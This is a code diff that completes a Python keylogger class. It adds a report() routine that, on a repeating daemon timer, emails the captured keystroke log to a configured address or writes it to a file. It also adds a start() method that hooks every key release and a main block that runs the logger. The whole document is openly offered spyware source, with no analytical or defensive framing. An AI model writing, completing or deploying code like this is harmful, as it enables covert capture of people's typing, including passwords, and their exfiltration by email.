@@ -54,5 +54,28 @@ class Keylogger:
         server.quit()
 
     def report(self):
-        #TO DO
-        pass
+        if self.log:
+            self.end_dt = datetime.now()
+            self.update_filename()
+
+            if self.report_method == "email":
+                self.send_email(EMAIL_ADDRESS, EMAIl_PASSWORD, self.log)
+            elif self.report_method == "file":
+                self.report_to_file()
+            
+            self.start_dt = datetime.now()
+
+        self.log = ""
+        timer = Timer(interval=self.interval, function=self.report)
+        timer.daemon = True
+        timer.start()
+
+    def start(self):
+        self.start_dt = datetime.now()
+        keyboard.on_release(callback=self.call_back)
+        self.report()
+        keyboard.wait()
+
+if __name__ == "__main__":
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger.start()
